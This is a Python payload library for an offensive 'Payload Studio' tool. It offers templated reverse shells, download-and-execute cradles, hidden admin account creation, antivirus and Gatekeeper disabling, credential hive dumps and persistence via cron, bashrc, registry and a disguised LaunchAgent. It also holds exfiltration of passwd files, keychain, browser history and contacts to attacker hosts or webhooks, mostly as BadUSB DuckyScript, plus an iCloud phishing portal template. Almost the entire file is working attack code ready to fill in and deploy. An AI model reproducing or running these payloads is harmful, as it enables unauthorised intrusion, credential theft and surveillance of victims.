#!/usr/bin/env python3
"""
ERR0RS ULTIMATE — Payload Studio Snippet Library v2.0
Standardized DuckyScript, Bash, and PowerShell templates.
Expanded from base 3 to 29 categorized snippets across 4 platforms.

get_payload(name, **kwargs) → fills {placeholders} in templates.
SNIPPETS dict → served via /api/payload_studio/snippets endpoint.

Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

# ═══════════════════════════════════════════════════════════════════════════
# RAW TEMPLATE STORE — for get_payload() API
# Keeps {placeholder} syntax for programmatic use
# ═══════════════════════════════════════════════════════════════════════════

SNIPPETS_RAW: dict[str, str] = {

    # ── LINUX ──────────────────────────────────────────────────────────────
    "linux_rev_shell": (
        "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    ),
    "linux_rev_shell_python": (
        "python3 -c \"import socket,subprocess,os;"
        "s=socket.socket();s.connect(('{ip}',{port}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call(['/bin/sh','-i'])\""
    ),
    "linux_rev_shell_nc": (
        "nc -e /bin/bash {ip} {port}"
    ),
    "persistence_cron": (
        "(crontab -l ; echo '*/5 * * * * /tmp/.backdoor') | crontab -"
    ),
    "persistence_bashrc": (
        "echo 'bash -i >& /dev/tcp/{ip}/{port} 0>&1' >> ~/.bashrc"
    ),
    "exfil_curl": (
        "curl -X POST {webhook} -d \"$(whoami)@$(hostname):$(cat /etc/passwd | base64)\""
    ),

    # ── WINDOWS POWERSHELL ─────────────────────────────────────────────────
    "win_rev_shell_ps": (
        "$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$stream=$client.GetStream();"
        "[byte[]]$bytes=0..65535|%{{0}};"
        "while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{"
        "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback=(iex $data 2>&1|Out-String);"
        "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
        "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
        "$client.Close()"
    ),
    "win_download_exec": (
        "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}/{payload}')\""
    ),
    "win_add_admin": (
        "net user {username} {password} /add & net localgroup administrators {username} /add"
    ),
    "win_disable_defender": (
        "Set-MpPreference -DisableRealtimeMonitoring $true; "
        "Set-MpPreference -DisableIOAVProtection $true"
    ),
    "win_dump_creds": (
        "reg save hklm\\sam C:\\Windows\\Temp\\sam.bak & "
        "reg save hklm\\system C:\\Windows\\Temp\\sys.bak"
    ),
    "win_persistence_reg": (
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
        "/v updater /t REG_SZ /d \"powershell -ep bypass -w hidden -f C:\\Users\\Public\\update.ps1\" /f"
    ),

    # ── DUCKYSCRIPT — WINDOWS ──────────────────────────────────────────────
    "badusb_win_ps_hidden": (
        "REM Hidden PowerShell reverse shell via Win+R\n"
        "DELAY 1000\n"
        "GUI r\n"
        "DELAY 600\n"
        "STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
        "\"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r+[char]26);"
        "$s.Write($rb,0,$rb.Length)};$c.Close()\"\n"
        "ENTER"
    ),
    "badusb_win_admin": (
        "REM Add hidden admin account\n"
        "DELAY 1000\n"
        "GUI r\n"
        "DELAY 600\n"
        "STRING cmd /c net user {username} {password} /add & "
        "net localgroup administrators {username} /add\n"
        "ENTER"
    ),
    "badusb_win_exfil_webhook": (
        "REM Exfiltrate system info via Discord webhook\n"
        "DELAY 500\n"
        "GUI r\n"
        "DELAY 600\n"
        "STRING powershell -w hidden -c "
        "\"$d=@{username='ERR0RS';content=\"+[char]34+\"$env:COMPUTERNAME | $env:USERNAME | "
        "$(ipconfig|Select-String 'IPv4')\"+[char]34+\"};"
        "Invoke-RestMethod -Uri '{webhook}' -Method Post -Body ($d|ConvertTo-Json) -ContentType 'application/json'\"\n"
        "ENTER"
    ),
    "badusb_win_lockscreen": (
        "REM Lock Windows screen immediately\n"
        "GUI l"
    ),
    "badusb_win_open_cmd": (
        "REM Open elevated CMD silently\n"
        "DELAY 500\n"
        "GUI r\n"
        "DELAY 600\n"
        "STRING cmd\n"
        "CTRL SHIFT ENTER\n"
        "DELAY 1000\n"
        "LEFTARROW\n"
        "ENTER\n"
        "DELAY 1500"
    ),

    # ── DUCKYSCRIPT — MACOS ────────────────────────────────────────────────
    "badusb_mac_rev_shell": (
        "REM macOS reverse shell via Spotlight terminal\n"
        "DELAY 500\n"
        "GUI SPACE\n"
        "DELAY 800\n"
        "STRING terminal\n"
        "DELAY 600\n"
        "ENTER\n"
        "DELAY 1500\n"
        "STRING bash -i >& /dev/tcp/{ip}/{port} 0>&1\n"
        "ENTER"
    ),
    "badusb_mac_exfil_keychain": (
        "REM Exfiltrate macOS Keychain info\n"
        "DELAY 500\n"
        "GUI SPACE\n"
        "DELAY 800\n"
        "STRING terminal\n"
        "DELAY 600\n"
        "ENTER\n"
        "DELAY 1500\n"
        "STRING security dump-keychain -d login.keychain 2>/dev/null | "
        "curl -X POST {webhook} --data-binary @-\n"
        "ENTER"
    ),
    "badusb_mac_persistence": (
        "REM macOS LaunchAgent persistence\n"
        "DELAY 500\n"
        "GUI SPACE\n"
        "DELAY 800\n"
        "STRING terminal\n"
        "DELAY 600\n"
        "ENTER\n"
        "DELAY 1500\n"
        "STRING echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict>"
        "<key>Label</key><string>com.apple.update</string>"
        "<key>ProgramArguments</key><array><string>bash</string><string>-i</string><string>>&</string>"
        "<string>/dev/tcp/{ip}/{port}</string><string>0>&1</string></array>"
        "<key>RunAtLoad</key><true/></dict></plist>' "
        "> ~/Library/LaunchAgents/com.apple.update.plist\n"
        "ENTER\n"
        "DELAY 500\n"
        "STRING launchctl load ~/Library/LaunchAgents/com.apple.update.plist\n"
        "ENTER"
    ),

    # ── DUCKYSCRIPT — ANDROID ─────────────────────────────────────────────
    "badusb_android_adb_shell": (
        "REM Android ADB reverse shell (USB debug must be on)\n"
        "DELAY 2000\n"
        "STRING adb shell am start --user 0 -a android.intent.action.VIEW "
        "-d 'intent:#Intent;component=com.android.settings/.Settings;end'\n"
        "ENTER"
    ),
    "badusb_android_enable_bt": (
        "REM Enable Android Bluetooth via Settings\n"
        "DELAY 1000\n"
        "STRING adb shell am start -a android.bluetooth.adapter.action.REQUEST_ENABLE\n"
        "ENTER"
    ),
    "badusb_android_lock_screen": (
        "REM Lock Android screen\n"
        "DELAY 500\n"
        "STRING adb shell input keyevent 26\n"
        "ENTER"
    ),

    # ── DUCKYSCRIPT — CROSS-PLATFORM ───────────────────────────────────────
    "badusb_flipper_linux": (
        "REM Linux Reverse Shell Payload — Flipper Zero\n"
        "DELAY 500\n"
        "GUI t\n"
        "DELAY 800\n"
        "STRING bash -i >& /dev/tcp/{ip}/{port} 0>&1\n"
        "ENTER"
    ),
    "badusb_wait_operator": (
        "REM Operator-triggered payload — waits for Flipper button press\n"
        "WAIT_FOR_BUTTON_PRESS\n"
        "DELAY 500"
    ),
    "badusb_rickroll": (
        "REM Classic rickroll — opens browser to Never Gonna Give You Up\n"
        "DELAY 1000\n"
        "GUI r\n"
        "DELAY 600\n"
        "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\n"
        "ENTER"
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
# PUBLIC API FUNCTION
# ═══════════════════════════════════════════════════════════════════════════

def get_payload(name: str, **kwargs) -> str:
    """
    Retrieve a payload template by name and fill in placeholders.

    Args:
        name:   Key from SNIPPETS_RAW (e.g. 'linux_rev_shell')
        **kwargs: Placeholder values (e.g. ip='192.168.1.1', port=4444)

    Returns:
        Filled payload string, or 'Payload not found.' if key missing.

    Examples:
        get_payload('linux_rev_shell', ip='192.168.1.1', port=4444)
        get_payload('badusb_win_ps_hidden', ip='10.0.0.1', port=9001)
        get_payload('win_add_admin', username='backdoor', password='P@ssw0rd123')
    """
    template = SNIPPETS_RAW.get(name)
    if template is None:
        return f"Payload not found: '{name}'. Available: {', '.join(SNIPPETS_RAW.keys())}"
    try:
        return template.format(**kwargs)
    except KeyError as e:
        return f"Missing placeholder {e} for payload '{name}'. Template: {template[:120]}..."


def list_payloads(platform: str | None = None) -> list[str]:
    """List all payload names, optionally filtered by platform prefix."""
    keys = list(SNIPPETS_RAW.keys())
    if platform:
        prefix_map = {
            "windows": ["win_", "badusb_win_"],
            "macos":   ["badusb_mac_"],
            "android": ["badusb_android_"],
            "linux":   ["linux_", "badusb_flipper_linux", "persistence_", "exfil_"],
            "cross":   ["badusb_wait_", "badusb_rickroll"],
        }
        prefixes = prefix_map.get(platform.lower(), [])
        if prefixes:
            keys = [k for k in keys if any(k.startswith(p) for p in prefixes)]
    return keys



# ═══════════════════════════════════════════════════════════════════════════
# SNIPPETS — structured JS-ready dict
# Served to the frontend via /api/payload_studio/snippets
# Each entry maps directly to a snippet card in the Payload Studio UI.
#
# Structure per snippet:
#   id:         unique key (matches SNIPPETS_RAW where applicable)
#   title:      display name
#   category:   recon | shell | credentials | persistence | exfil |
#               disruption | surveillance | utility | prank
#   difficulty: Beginner | Intermediate | Advanced
#   tags:       list of search/filter keywords
#   desc:       one-line description shown in teach mode
#   platform:   windows | macos | android | ios | linux | cross
#   code:       DuckyScript or shell code (ready to paste)
# ═══════════════════════════════════════════════════════════════════════════

SNIPPETS: dict = {

    # ══════════════════════════════════════════════════════
    # PLATFORM: windows
    # ══════════════════════════════════════════════════════
    "windows": [
        {
            "id":         "badusb_win_ps_hidden",
            "title":      "Hidden PowerShell Reverse Shell",
            "category":   "shell",
            "difficulty": "Intermediate",
            "tags":       ["powershell", "reverse shell", "windows", "hidden", "tcpclient"],
            "desc":       "Opens hidden PowerShell via Win+R and connects back to attacker. No window visible.",
            "platform":   "windows",
            "code": (
                "REM Hidden PowerShell reverse shell via Win+R\n"
                "REM Replace ATTACKER_IP and PORT before deploying\n"
                "DELAY 1000\n"
                "GUI r\n"
                "DELAY 600\n"
                "STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
                '"$c=New-Object Net.Sockets.TCPClient(\'ATTACKER_IP\',4444);'
                "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
                "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
                "$d=[Text.Encoding]::ASCII.GetString($b,0,$i);"
                "$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r+[char]26);"
                '$s.Write($rb,0,$rb.Length)};$c.Close()"\n'
                "ENTER"
            ),
        },
        {
            "id":         "badusb_win_open_cmd",
            "title":      "Open Elevated CMD (UAC Bypass)",
            "category":   "privesc",
            "difficulty": "Intermediate",
            "tags":       ["cmd", "uac", "admin", "elevate", "windows"],
            "desc":       "Opens elevated CMD prompt using Ctrl+Shift+Enter UAC bypass trick.",
            "platform":   "windows",
            "code": (
                "REM Open elevated CMD silently via UAC bypass\n"
                "DELAY 500\n"
                "GUI r\n"
                "DELAY 600\n"
                "STRING cmd\n"
                "CTRL SHIFT ENTER\n"
                "DELAY 1200\n"
                "LEFTARROW\n"
                "ENTER\n"
                "DELAY 1500"
            ),
        },
        {
            "id":         "badusb_win_admin",
            "title":      "Add Hidden Admin Account",
            "category":   "persistence",
            "difficulty": "Beginner",
            "tags":       ["net user", "admin", "account", "windows", "persistence"],
            "desc":       "Creates a new local admin user. Replace username/password before use.",
            "platform":   "windows",
            "code": (
                "REM Add hidden admin account — replace USERNAME and PASSWORD\n"
                "DELAY 1000\n"
                "GUI r\n"
                "DELAY 600\n"
                "STRING cmd /c net user USERNAME P@ssw0rd123 /add & "
                "net localgroup administrators USERNAME /add\n"
                "ENTER"
            ),
        },
        {
            "id":         "badusb_win_exfil_webhook",
            "title":      "Exfil via Discord Webhook",
            "category":   "exfil",
            "difficulty": "Intermediate",
            "tags":       ["discord", "webhook", "exfil", "sysinfo", "powershell"],
            "desc":       "Sends hostname, username, and IP info to a Discord webhook. Replace WEBHOOK_URL.",
            "platform":   "windows",
            "code": (
                "REM Exfil system info via Discord webhook\n"
                "REM Replace WEBHOOK_URL with real Discord webhook\n"
                "DELAY 500\n"
                "GUI r\n"
                "DELAY 600\n"
                "STRING powershell -w hidden -c "
                '"$d=@{username=\'ERR0RS\';content=\"$env:COMPUTERNAME | $env:USERNAME | '
                "$(ipconfig|Select-String 'IPv4')\"};"
                "Invoke-RestMethod -Uri 'WEBHOOK_URL' -Method Post "
                "-Body ($d|ConvertTo-Json) -ContentType 'application/json'\"\n"
                "ENTER"
            ),
        },
        {
            "id":         "badusb_win_persistence_reg",
            "title":      "Registry Run Key Persistence",
            "category":   "persistence",
            "difficulty": "Intermediate",
            "tags":       ["registry", "run key", "persistence", "startup", "windows"],
            "desc":       "Adds a registry run key so a script executes every time the user logs in.",
            "platform":   "windows",
            "code": (
                "REM Registry Run Key persistence — edit path before use\n"
                "DELAY 1000\n"
                "GUI r\n"
                "DELAY 600\n"
                "STRING powershell -w hidden -c \""
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
                "/v updater /t REG_SZ "
                "/d 'powershell -ep bypass -w hidden -f C:\\Users\\Public\\update.ps1' /f\"\n"
                "ENTER"
            ),
        },
        {
            "id":         "badusb_win_download_exec",
            "title":      "Download & Execute Payload",
            "category":   "shell",
            "difficulty": "Intermediate",
            "tags":       ["download", "execute", "iex", "cradle", "powershell"],
            "desc":       "Downloads and executes a remote PowerShell script. Classic IEX cradle. Replace ATTACKER_IP.",
            "platform":   "windows",
            "code": (
                "REM Download & Execute payload — replace ATTACKER_IP\n"
                "DELAY 1000\n"
                "GUI r\n"
                "DELAY 600\n"
                "STRING powershell -ep bypass -c "
                '"IEX(New-Object Net.WebClient).DownloadString(\'http://ATTACKER_IP/payload.ps1\')"\n'
                "ENTER"
            ),
        },
        {
            "id":         "badusb_win_dump_loot",
            "title":      "Dump SAM & SYSTEM Hives",
            "category":   "credentials",
            "difficulty": "Advanced",
            "tags":       ["sam", "system", "credentials", "hash", "dump"],
            "desc":       "Saves SAM and SYSTEM registry hives for offline hash extraction with Impacket/Secretsdump.",
            "platform":   "windows",
            "code": (
                "REM Dump SAM + SYSTEM for offline hash extraction\n"
                "REM Requires admin — use 'Open Elevated CMD' snippet first\n"
                "DELAY 1000\n"
                "STRING reg save hklm\\sam C:\\Windows\\Temp\\sam.bak\n"
                "ENTER\n"
                "DELAY 800\n"
                "STRING reg save hklm\\system C:\\Windows\\Temp\\sys.bak\n"
                "ENTER\n"
                "DELAY 500\n"
                "STRING echo Done. Retrieve: C:\\Windows\\Temp\\sam.bak and sys.bak\n"
                "ENTER"
            ),
        },
        {
            "id":         "badusb_win_disable_defender",
            "title":      "Disable Windows Defender (PS)",
            "category":   "evasion",
            "difficulty": "Advanced",
            "tags":       ["defender", "antivirus", "disable", "evasion", "powershell"],
            "desc":       "Disables Windows Defender real-time monitoring via PowerShell. Requires admin.",
            "platform":   "windows",
            "code": (
                "REM Disable Defender — requires admin PowerShell\n"
                "DELAY 1000\n"
                "STRING Set-MpPreference -DisableRealtimeMonitoring $true\n"
                "ENTER\n"
                "DELAY 500\n"
                "STRING Set-MpPreference -DisableIOAVProtection $true\n"
                "ENTER\n"
                "DELAY 500\n"
                "STRING Set-MpPreference -DisableBehaviorMonitoring $true\n"
                "ENTER"
            ),
        },
        {
            "id":         "badusb_win_lockscreen",
            "title":      "Lock Workstation",
            "category":   "disruption",
            "difficulty": "Beginner",
            "tags":       ["lock", "screen", "disrupt", "windows"],
            "desc":       "Locks the Windows workstation immediately using Win+L shortcut.",
            "platform":   "windows",
            "code": (
                "REM Lock Windows workstation immediately\n"
                "DELAY 500\n"
                "GUI l"
            ),
        },
    ],


    # ══════════════════════════════════════════════════════
    # PLATFORM: macos
    # ══════════════════════════════════════════════════════
    "macos": [
        {
            "id":         "badusb_mac_rev_shell",
            "title":      "macOS Bash Reverse Shell",
            "category":   "shell",
            "difficulty": "Intermediate",
            "tags":       ["bash", "reverse shell", "macos", "terminal", "spotlight"],
            "desc":       "Opens Terminal via Spotlight and fires a bash reverse shell. Replace ATTACKER_IP.",
            "platform":   "macos",
            "code": (
                "REM macOS reverse shell via Spotlight → Terminal\n"
                "REM Replace ATTACKER_IP and PORT\n"
                "DELAY 500\n"
                "GUI SPACE\n"
                "DELAY 900\n"
                "STRING terminal\n"
                "DELAY 700\n"
                "ENTER\n"
                "DELAY 1500\n"
                "STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n"
                "ENTER"
            ),
        },
        {
            "id":         "badusb_mac_exfil_sysinfo",
            "title":      "Exfil macOS System Info",
            "category":   "recon",
            "difficulty": "Intermediate",
            "tags":       ["exfil", "sysinfo", "curl", "macos", "recon"],
            "desc":       "Gathers hostname, user, IP, and sends to attacker via curl. Replace ATTACKER_IP.",
            "platform":   "macos",
            "code": (
                "REM Exfil macOS system info via HTTP POST\n"
                "REM Replace ATTACKER_IP\n"
                "DELAY 500\n"
                "GUI SPACE\n"
                "DELAY 900\n"
                "STRING terminal\n"
                "DELAY 700\n"
                "ENTER\n"
                "DELAY 1500\n"
                "STRING curl -X POST http://ATTACKER_IP/loot "
                "-d \"host=$(hostname)&user=$(whoami)&ip=$(ipconfig getifaddr en0)\"\n"
                "ENTER"
            ),
        },
        {
            "id":         "badusb_mac_persistence",
            "title":      "macOS LaunchAgent Persistence",
            "category":   "persistence",
            "difficulty": "Advanced",
            "tags":       ["launchagent", "persistence", "plist", "macos", "startup"],
            "desc":       "Installs a LaunchAgent plist to auto-run a reverse shell on login. Replace ATTACKER_IP.",
            "platform":   "macos",
            "code": (
                "REM macOS LaunchAgent persistence — replace ATTACKER_IP\n"
                "DELAY 500\n"
                "GUI SPACE\n"
                "DELAY 900\n"
                "STRING terminal\n"
                "DELAY 700\n"
                "ENTER\n"
                "DELAY 1500\n"
                "STRING cat > ~/Library/LaunchAgents/com.apple.update.plist << 'EOF'\n"
                "ENTER\n"
                "STRING <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                "ENTER\n"
                "STRING <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
                "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
                "ENTER\n"
                "STRING <plist version=\"1.0\"><dict>"
                "<key>Label</key><string>com.apple.update</string>"
                "<key>ProgramArguments</key><array>"
                "<string>bash</string><string>-c</string>"
                "<string>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</string>"
                "</array><key>RunAtLoad</key><true/></dict></plist>\n"
                "ENTER\n"
                "STRING EOF\n"
                "ENTER\n"
                "DELAY 500\n"
                "STRING launchctl load ~/Library/LaunchAgents/com.apple.update.plist\n"
                "ENTER"
            ),
        },
        {
            "id":         "badusb_mac_disable_gatekeeper",
            "title":      "Disable Gatekeeper (macOS)",
            "category":   "evasion",
            "difficulty": "Advanced",
            "tags":       ["gatekeeper", "disable", "macos", "evasion", "spctl"],
            "desc":       "Disables macOS Gatekeeper to allow unsigned apps. Requires password prompt.",
            "platform":   "macos",
            "code": (
                "REM Disable macOS Gatekeeper — requires admin password\n"
                "DELAY 500\n"
                "GUI SPACE\n"
                "DELAY 900\n"
                "STRING terminal\n"
                "DELAY 700\n"
                "ENTER\n"
                "DELAY 1500\n"
                "STRING sudo spctl --master-disable\n"
                "ENTER\n"
                "DELAY 2000\n"
                "REM Enter sudo password here if needed\n"
                "REM STRING your_password\n"
                "REM ENTER"
            ),
        },
        {
            "id":         "badusb_mac_safari_history",
            "title":      "Exfil Safari History",
            "category":   "surveillance",
            "difficulty": "Intermediate",
            "tags":       ["safari", "history", "exfil", "macos", "browser"],
            "desc":       "Copies Safari browsing history database to /tmp for exfiltration. Replace ATTACKER_IP.",
            "platform":   "macos",
            "code": (
                "REM Exfil Safari history — replace ATTACKER_IP\n"
                "DELAY 500\n"
                "GUI SPACE\n"
                "DELAY 900\n"
                "STRING terminal\n"
                "DELAY 700\n"
                "ENTER\n"
                "DELAY 1500\n"
                "STRING cp ~/Library/Safari/History.db /tmp/hist.db && "
                "curl -X POST http://ATTACKER_IP/loot -F 'file=@/tmp/hist.db'\n"
                "ENTER"
            ),
        },
    ],

    # ══════════════════════════════════════════════════════
    # PLATFORM: android
    # ══════════════════════════════════════════════════════
    "android": [
        {
            "id":         "badusb_android_rev_shell",
            "title":      "Android ADB Reverse Shell",
            "category":   "shell",
            "difficulty": "Advanced",
            "tags":       ["adb", "android", "reverse shell", "shell", "usb debug"],
            "desc":       "Sends an ADB shell command via HID if USB debugging is enabled. Replace ATTACKER_IP.",
            "platform":   "android",
            "code": (
                "REM Android ADB reverse shell\n"
                "REM Requires USB Debugging ENABLED on target device\n"
                "REM Replace ATTACKER_IP and PORT\n"
                "DELAY 2000\n"
                "STRING adb shell am start --user 0 -a android.intent.action.VIEW\n"
                "ENTER\n"
                "DELAY 1000\n"
                "STRING adb shell bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &'\n"
                "ENTER"
            ),
        },
        {
            "id":         "badusb_android_exfil_contacts",
            "title":      "Exfil Android Contacts (ADB)",
            "category":   "exfil",
            "difficulty": "Advanced",
            "tags":       ["contacts", "exfil", "adb", "android", "content provider"],
            "desc":       "Dumps Android contacts database via ADB content provider query.",
            "platform":   "android",
            "code": (
                "REM Exfil Android contacts via ADB\n"
                "DELAY 1000\n"
                "STRING adb shell content query --uri content://contacts/phones/ "
                "--projection display_name:number > /sdcard/contacts.txt\n"
                "ENTER\n"
                "DELAY 1500\n"
                "STRING adb pull /sdcard/contacts.txt ./contacts.txt\n"
                "ENTER"
            ),
        },
        {
            "id":         "badusb_android_lock",
            "title":      "Lock Android Screen",
            "category":   "disruption",
            "difficulty": "Beginner",
            "tags":       ["lock", "screen", "android", "keyevent"],
            "desc":       "Locks the Android screen using ADB keyevent (power button).",
            "platform":   "android",
            "code": (
                "REM Lock Android screen via ADB\n"
                "DELAY 500\n"
                "STRING adb shell input keyevent 26\n"
                "ENTER"
            ),
        },
        {
            "id":         "badusb_android_sysinfo",
            "title":      "Dump Android System Info",
            "category":   "recon",
            "difficulty": "Beginner",
            "tags":       ["sysinfo", "recon", "android", "adb", "device"],
            "desc":       "Dumps Android device info, OS version, IMEI, and installed apps via ADB.",
            "platform":   "android",
            "code": (
                "REM Dump Android system info\n"
                "DELAY 500\n"
                "STRING adb shell getprop ro.product.model && "
                "adb shell getprop ro.build.version.release && "
                "adb shell service call iphonesubinfo 1\n"
                "ENTER\n"
                "DELAY 1000\n"
                "STRING adb shell pm list packages -3\n"
                "ENTER"
            ),
        },
    ],

    # ══════════════════════════════════════════════════════
    # PLATFORM: ios
    # ══════════════════════════════════════════════════════
    "ios": [
        {
            "id":         "ios_vector_overview",
            "title":      "iOS Attack Vector Overview",
            "category":   "utility",
            "difficulty": "Beginner",
            "tags":       ["ios", "iphone", "attack surface", "overview", "evil portal"],
            "desc":       "Reference card: iOS attack surface — Evil Portal, MDM profiles, Lightning cable attacks.",
            "platform":   "ios",
            "code": (
                "REM iOS ATTACK VECTOR OVERVIEW\n"
                "REM ═══════════════════════════════════\n"
                "REM\n"
                "REM VECTOR 1: Evil Portal (WiFi Pineapple / Flipper + WiFi Board)\n"
                "REM   Target connects to rogue AP → captive portal prompts credentials\n"
                "REM   Tool: WiFi Pineapple PineAP module / Flipper WiFi dev board\n"
                "REM\n"
                "REM VECTOR 2: Malicious MDM Profile\n"
                "REM   Host a .mobileconfig file → tricks user into installing\n"
                "REM   Can install CA certs, VPN configs, force managed apps\n"
                "REM   Tool: iPhone Backup Analyzer / Apple Configurator\n"
                "REM\n"
                "REM VECTOR 3: O.MG Cable / Lightning HID\n"
                "REM   Looks like a real lightning cable, runs DuckyScript\n"
                "REM   Works while iOS is unlocked\n"
                "REM\n"
                "REM VECTOR 4: AirDrop Phishing\n"
                "REM   Broadcast malicious contact card or image\n"
                "REM   Works in open AirDrop mode\n"
                "REM ═══════════════════════════════════\n"
                "REM No DuckyScript — reference note only"
            ),
        },
        {
            "id":         "ios_evil_portal_template",
            "title":      "Evil Portal — iOS iCloud Login",
            "category":   "credentials",
            "difficulty": "Intermediate",
            "tags":       ["evil portal", "ios", "icloud", "phishing", "captive portal"],
            "desc":       "Evil Portal template that mimics an iCloud login page. Deploy via Flipper WiFi board.",
            "platform":   "ios",
            "code": (
                "REM Evil Portal — iCloud login phishing page\n"
                "REM Deploy HTML file to Flipper Zero WiFi dev board\n"
                "REM See: /evil_portal/ directory for full HTML template\n"
                "REM\n"
                "REM SETUP:\n"
                "REM 1. Copy portal HTML to Flipper SD: apps_data/evil_portal/index.html\n"
                "REM 2. Enable Evil Portal in Flipper WiFi app\n"
                "REM 3. Target iOS device connects to rogue AP\n"
                "REM 4. Captive portal shows fake iCloud login\n"
                "REM 5. Credentials saved to Flipper SD log\n"
                "REM\n"
                "REM TEMPLATE:\n"
                "REM <!DOCTYPE html><html><head><title>iCloud</title></head>\n"
                "REM <body><form action='/save' method='post'>\n"
                "REM <input name='user' placeholder='Apple ID'>\n"
                "REM <input name='pass' type='password' placeholder='Password'>\n"
                "REM <button type='submit'>Sign In</button></form></body></html>"
            ),
        },
        {
            "id":         "ios_mdm_profile_note",
            "title":      "Malicious MDM Profile Reference",
            "category":   "surveillance",
            "difficulty": "Advanced",
            "tags":       ["mdm", "mobileconfig", "ios", "profile", "surveillance"],
            "desc":       "Reference for creating malicious .mobileconfig MDM profiles. Install via AirDrop or web link.",
            "platform":   "ios",
            "code": (
                "REM MDM PROFILE ATTACK — reference only, no DuckyScript\n"
                "REM\n"
                "REM .mobileconfig files can:\n"
                "REM   - Install attacker CA certificates (MITM HTTPS)\n"
                "REM   - Configure VPN to route traffic through attacker\n"
                "REM   - Restrict device settings\n"
                "REM   - Install managed apps silently\n"
                "REM\n"
                "REM DELIVERY:\n"
                "REM   - Host .mobileconfig at http://ATTACKER_IP/profile.mobileconfig\n"
                "REM   - Send link via Evil Portal, AirDrop, iMessage\n"
                "REM   - iOS prompts: 'Do you want to install this profile?'\n"
                "REM\n"
                "REM CREATION TOOL:\n"
                "REM   Apple Configurator 2 (Mac App Store, free)\n"
                "REM   iphone-backup-analyzer for inspection"
            ),
        },
    ],

}  # End SNIPPETS dict

